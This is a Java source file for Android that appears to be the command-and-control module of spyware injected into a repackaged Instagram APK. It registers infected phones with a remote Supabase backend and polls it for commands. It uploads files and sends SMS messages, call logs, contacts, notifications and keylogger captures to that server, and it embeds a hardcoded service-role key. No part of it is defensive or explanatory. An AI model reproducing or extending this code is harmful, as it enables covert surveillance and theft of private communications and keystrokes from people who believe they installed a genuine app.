// Updated for Instagram APK integration with Supabase
package sigma.male;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Supabase Client for Android - Alternative Version with Direct Configuration
 * This version uses direct string configuration instead of R.string resources
 * Use this if you have issues with R.string references during APK modification
 */
public class SupabaseClientDirect {
    private static final String TAG = "SupabaseClient";
    private static SupabaseClientDirect instance;
    
    // Direct configuration for AIRAVAT Instagram APK with Supabase
    private static final String SUPABASE_URL = "https://auedkftrlingnnyeezgc.supabase.co";
    private static final String SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF1ZWRrZnRybGluZ25ueWVlemdjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzUzOTMwNzQsImV4cCI6MjA1MDk2OTA3NH0.OJXZe6eQJOhmVeB9y8TE3L-8_zGWwEfB2eEp1SfLdpE";
    private static final String SUPABASE_SERVICE_ROLE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF1ZWRrZnRybGluZ25ueWVlemdjIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczNTM5MzA3NCwiZXhwIjoyMDUwOTY5MDc0fQ.gqOvWutgK_c7xr1wutw_kkJ7-4WieFQUfpUCcEA_1_0";
    
    private String supabaseUrl;
    private String anonKey;
    private String serviceRoleKey;
    private Context context;
    private ExecutorService executor;
    
    private SupabaseClientDirect(Context context) {
        this.context = context.getApplicationContext();
        this.executor = Executors.newCachedThreadPool();
        
        // Use direct configuration
        this.supabaseUrl = SUPABASE_URL;
        this.anonKey = SUPABASE_ANON_KEY;
        this.serviceRoleKey = SUPABASE_SERVICE_ROLE_KEY;
        
        Log.i(TAG, "SupabaseClient initialized with URL: " + this.supabaseUrl);
    }
    
    public static synchronized SupabaseClientDirect getInstance(Context context) {
        if (instance == null) {
            instance = new SupabaseClientDirect(context);
        }
        return instance;
    }
    
    /**
     * Register device as online
     */
    public void registerDevice(String deviceId, String deviceModel, String androidVersion, 
                              String batteryLevel, String isRooted, SupabaseCallback callback) {
        executor.execute(() -> {
            try {
                JSONObject deviceData = new JSONObject();
                deviceData.put("device_id", deviceId);
                deviceData.put("device_model", deviceModel);
                deviceData.put("android_version", androidVersion);
                deviceData.put("battery_level", batteryLevel);
                deviceData.put("is_rooted", isRooted);
                deviceData.put("last_seen", getCurrentTimestamp());
                
                String response = makeRequest("POST", "/rest/v1/online_devices", deviceData.toString(), true);
                
                if (callback != null) {
                    callback.onSuccess(response);
                }
            } catch (Exception e) {
                Log.e(TAG, "Error registering device", e);
                if (callback != null) {
                    callback.onError(e.getMessage());
                }
            }
        });
    }
    
    /**
     * Update device status (keep alive)
     */
    public void updateDeviceStatus(String deviceId, String batteryLevel) {
        executor.execute(() -> {
            try {
                JSONObject updateData = new JSONObject();
                updateData.put("battery_level", batteryLevel);
                updateData.put("last_seen", getCurrentTimestamp());
                
                String endpoint = "/rest/v1/online_devices?device_id=eq." + deviceId;
                makeRequest("PATCH", endpoint, updateData.toString(), true);
            } catch (Exception e) {
                Log.e(TAG, "Error updating device status", e);
            }
        });
    }
    
    /**
     * Listen for commands from control panel
     */
    public void listenForCommands(String deviceId, CommandListener listener) {
        executor.execute(() -> {
            while (true) {
                try {
                    String endpoint = "/rest/v1/device_commands?device_id=eq." + deviceId + "&status=eq.pending&order=created_at.desc";
                    String response = makeRequest("GET", endpoint, null, false);
                    
                    JSONArray commands = new JSONArray(response);
                    for (int i = 0; i < commands.length(); i++) {
                        JSONObject command = commands.getJSONObject(i);
                        
                        // Mark command as executing
                        updateCommandStatus(command.getLong("id"), "executing");
                        
                        // Execute command
                        if (listener != null) {
                            listener.onCommandReceived(command);
                        }
                    }
                    
                    // Wait before next poll
                    Thread.sleep(2000);
                } catch (Exception e) {
                    Log.e(TAG, "Error listening for commands", e);
                    try {
                        Thread.sleep(5000); // Wait longer on error
                    } catch (InterruptedException ie) {
                        break;
                    }
                }
            }
        });
    }
    
    /**
     * Send command response
     */
    public void sendResponse(String deviceId, long commandId, String responseData, 
                           String value1, String value2, String value3, String var2, 
                           SupabaseCallback callback) {
        executor.execute(() -> {
            try {
                JSONObject responseObj = new JSONObject();
                responseObj.put("device_id", deviceId);
                responseObj.put("command_id", commandId);
                responseObj.put("response_data", responseData);
                responseObj.put("value1", value1);
                responseObj.put("value2", value2);
                responseObj.put("value3", value3);
                responseObj.put("var2", var2);
                responseObj.put("response_type", "command_response");
                
                String response = makeRequest("POST", "/rest/v1/device_responses", responseObj.toString(), true);
                
                // Mark command as completed
                updateCommandStatus(commandId, "completed");
                
                if (callback != null) {
                    callback.onSuccess(response);
                }
            } catch (Exception e) {
                Log.e(TAG, "Error sending response", e);
                if (callback != null) {
                    callback.onError(e.getMessage());
                }
            }
        });
    }
    
    /**
     * Upload file to Supabase Storage
     */
    public void uploadFile(String deviceId, String filePath, String fileName, 
                          String fileType, byte[] fileData, SupabaseCallback callback) {
        executor.execute(() -> {
            try {
                // Upload to storage
                String storagePath = deviceId + "/" + fileName;
                String storageUrl = uploadToStorage(storagePath, fileData, fileType);
                
                // Save file metadata to database
                JSONObject fileMetadata = new JSONObject();
                fileMetadata.put("device_id", deviceId);
                fileMetadata.put("file_path", filePath);
                fileMetadata.put("file_name", fileName);
                fileMetadata.put("file_size", fileData.length);
                fileMetadata.put("file_type", fileType);
                fileMetadata.put("storage_url", storageUrl);
                
                makeRequest("POST", "/rest/v1/device_files", fileMetadata.toString(), true);
                
                if (callback != null) {
                    callback.onSuccess(storageUrl);
                }
            } catch (Exception e) {
                Log.e(TAG, "Error uploading file", e);
                if (callback != null) {
                    callback.onError(e.getMessage());
                }
            }
        });
    }
    
    /**
     * Save SMS data
     */
    public void saveSmsData(String deviceId, String phoneNumber, String messageContent, 
                           String messageType, String timestamp) {
        executor.execute(() -> {
            try {
                JSONObject smsData = new JSONObject();
                smsData.put("device_id", deviceId);
                smsData.put("phone_number", phoneNumber);
                smsData.put("message_content", messageContent);
                smsData.put("message_type", messageType);
                smsData.put("timestamp_sms", timestamp);
                
                makeRequest("POST", "/rest/v1/device_sms", smsData.toString(), true);
            } catch (Exception e) {
                Log.e(TAG, "Error saving SMS data", e);
            }
        });
    }
    
    /**
     * Save call log data
     */
    public void saveCallLogData(String deviceId, String phoneNumber, String contactName, 
                               String callType, int duration, String timestamp) {
        executor.execute(() -> {
            try {
                JSONObject callData = new JSONObject();
                callData.put("device_id", deviceId);
                callData.put("phone_number", phoneNumber);
                callData.put("contact_name", contactName);
                callData.put("call_type", callType);
                callData.put("call_duration", duration);
                callData.put("call_timestamp", timestamp);
                
                makeRequest("POST", "/rest/v1/device_call_logs", callData.toString(), true);
            } catch (Exception e) {
                Log.e(TAG, "Error saving call log data", e);
            }
        });
    }
    
    /**
     * Save contact data
     */
    public void saveContactData(String deviceId, String contactName, String phoneNumber, String email) {
        executor.execute(() -> {
            try {
                JSONObject contactData = new JSONObject();
                contactData.put("device_id", deviceId);
                contactData.put("contact_name", contactName);
                contactData.put("phone_number", phoneNumber);
                contactData.put("email", email);
                
                makeRequest("POST", "/rest/v1/device_contacts", contactData.toString(), true);
            } catch (Exception e) {
                Log.e(TAG, "Error saving contact data", e);
            }
        });
    }
    
    /**
     * Save notification data
     */
    public void saveNotificationData(String deviceId, String appName, String title, 
                                   String text, String timestamp) {
        executor.execute(() -> {
            try {
                JSONObject notificationData = new JSONObject();
                notificationData.put("device_id", deviceId);
                notificationData.put("app_name", appName);
                notificationData.put("notification_title", title);
                notificationData.put("notification_text", text);
                notificationData.put("notification_timestamp", timestamp);
                
                makeRequest("POST", "/rest/v1/device_notifications", notificationData.toString(), true);
            } catch (Exception e) {
                Log.e(TAG, "Error saving notification data", e);
            }
        });
    }
    
    /**
     * Save keylogger data
     */
    public void saveKeyloggerData(String deviceId, String appName, String keylogData, String timestamp) {
        executor.execute(() -> {
            try {
                JSONObject keyloggerData = new JSONObject();
                keyloggerData.put("device_id", deviceId);
                keyloggerData.put("app_name", appName);
                keyloggerData.put("keylog_data", keylogData);
                keyloggerData.put("timestamp_keylog", timestamp);
                
                makeRequest("POST", "/rest/v1/device_keylogger", keyloggerData.toString(), true);
            } catch (Exception e) {
                Log.e(TAG, "Error saving keylogger data", e);
            }
        });
    }
    
    // Private helper methods
    
    private void updateCommandStatus(long commandId, String status) {
        try {
            JSONObject statusUpdate = new JSONObject();
            statusUpdate.put("status", status);
            if ("executing".equals(status) || "completed".equals(status)) {
                statusUpdate.put("executed_at", getCurrentTimestamp());
            }
            
            String endpoint = "/rest/v1/device_commands?id=eq." + commandId;
            makeRequest("PATCH", endpoint, statusUpdate.toString(), true);
        } catch (Exception e) {
            Log.e(TAG, "Error updating command status", e);
        }
    }
    
    private String makeRequest(String method, String endpoint, String data, boolean useServiceRole) {
        try {
            URL url = URI.create(supabaseUrl + endpoint).toURL();
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            
            // Set headers
            conn.setRequestMethod(method);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("apikey", useServiceRole ? serviceRoleKey : anonKey);
            conn.setRequestProperty("Authorization", "Bearer " + (useServiceRole ? serviceRoleKey : anonKey));
            
            if ("POST".equals(method) || "PATCH".equals(method)) {
                conn.setDoOutput(true);
                if (data != null) {
                    try (OutputStream os = conn.getOutputStream()) {
                        os.write(data.getBytes("UTF-8"));
                    }
                }
            }
            
            // Read response
            int responseCode = conn.getResponseCode();
            InputStream inputStream = responseCode >= 200 && responseCode < 300 
                ? conn.getInputStream() 
                : conn.getErrorStream();
            
            StringBuilder response = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
            }
            
            if (responseCode >= 200 && responseCode < 300) {
                return response.toString();
            } else {
                throw new IOException("HTTP " + responseCode + ": " + response.toString());
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Request error: " + method + " " + endpoint, e);
            throw new RuntimeException(e);
        }
    }
    
    private String uploadToStorage(String path, byte[] fileData, String contentType) throws Exception {
        URL url = URI.create(supabaseUrl + "/storage/v1/object/device-files/" + path).toURL();
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        
        conn.setRequestMethod("POST");
        conn.setRequestProperty("apikey", serviceRoleKey);
        conn.setRequestProperty("Authorization", "Bearer " + serviceRoleKey);
        conn.setRequestProperty("Content-Type", contentType);
        conn.setDoOutput(true);
        
        try (OutputStream os = conn.getOutputStream()) {
            os.write(fileData);
        }
        
        int responseCode = conn.getResponseCode();
        if (responseCode >= 200 && responseCode < 300) {
            return supabaseUrl + "/storage/v1/object/public/device-files/" + path;
        } else {
            throw new IOException("Upload failed with code: " + responseCode);
        }
    }
    
    private String getCurrentTimestamp() {
        return new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US)
            .format(new java.util.Date());
    }
    
    // Interfaces
    public interface SupabaseCallback {
        void onSuccess(String result);
        void onError(String error);
    }
    
    public interface CommandListener {
        void onCommandReceived(JSONObject command);
    }
}

/**
 * Device Information Helper - Same as original
 */
class DeviceInfoHelperDirect {
    public static String getDeviceId(Context context) {
        SharedPreferences prefs = context.getSharedPreferences("device_prefs", Context.MODE_PRIVATE);
        String deviceId = prefs.getString("device_id", null);
        
        if (deviceId == null) {
            deviceId = java.util.UUID.randomUUID().toString();
            prefs.edit().putString("device_id", deviceId).apply();
        }
        
        return deviceId;
    }
    
    public static String getDeviceModel() {
        return android.os.Build.MODEL;
    }
    
    public static String getAndroidVersion() {
        return android.os.Build.VERSION.RELEASE;
    }
    
    public static String getBatteryLevel(Context context) {
        try {
            android.content.IntentFilter filter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent batteryStatus = context.registerReceiver(null, filter);
            
            int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            
            float batteryPct = level / (float) scale;
            return Math.round(batteryPct * 100) + "%";
        } catch (Exception e) {
            return "Unknown";
        }
    }
    
    public static String isDeviceRooted() {
        try {
            // Check for common root indicators
            String[] rootIndicators = {
                "/system/app/Superuser.apk",
                "/sbin/su",
                "/system/bin/su",
                "/system/xbin/su",
                "/data/local/xbin/su",
                "/data/local/bin/su",
                "/system/sd/xbin/su",
                "/system/bin/failsafe/su",
                "/data/local/su"
            };
            
            for (String path : rootIndicators) {
                if (new java.io.File(path).exists()) {
                    return "Yes";
                }
            }
            
            // Try to execute su command using ProcessBuilder (non-deprecated)
            ProcessBuilder processBuilder = new ProcessBuilder("su");
            Process process = processBuilder.start();
            process.destroy();
            return "Yes";
        } catch (Exception e) {
            return "No";
        }
    }
}
